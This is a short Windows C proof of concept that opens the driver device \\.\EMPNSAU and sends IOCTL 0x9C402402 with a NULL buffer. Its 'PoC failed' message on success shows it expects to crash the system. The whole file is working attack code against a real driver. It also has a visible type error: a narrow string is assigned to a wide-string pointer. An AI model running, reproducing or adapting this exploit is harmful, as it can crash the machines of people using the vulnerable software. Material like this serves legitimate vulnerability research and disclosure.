#include <stdio.h>
#include <tchar.h>
#include <Windows.h>

int main()
{
	HANDLE hDevice;
	LPCWSTR lpDeviceName = "\\\\.\\EMPNSAU";
	DWORD bResult;
	DWORD junk = 0;

	wprintf(L" [*] Trying to get a handle to the following Driver: %ls\n", lpDeviceName);

	hDevice = CreateFile(lpDeviceName,		
		GENERIC_READ | GENERIC_WRITE,				
		FILE_SHARE_WRITE,					
		NULL,							
		OPEN_EXISTING,						
		FILE_FLAG_OVERLAPPED | FILE_ATTRIBUTE_NORMAL,		
		NULL);							


	if (hDevice == INVALID_HANDLE_VALUE)
	{
		wprintf(L" -> Unable to get Driver handle!\n\n");
		exit(1);
	}

	wprintf(L" [+] Our Device Handle: 0x%p \n", hDevice);
	wprintf(L" [*] Lets send NULL to the Driver\n");

	bResult = DeviceIoControl(hDevice,
		0x9C402402,			           
		NULL,				                   
		0,			                         
		NULL,
    		0,
		&junk,			
		(LPOVERLAPPED)NULL);

	if (!bResult) {
		wprintf(L" -> Failed to send Data!\n\n");
		CloseHandle(hDevice);
		exit(1);
	}
	wprintf(L" [-] Error sending data, PoC failed...");
	CloseHandle(hDevice);
	return 0;
}
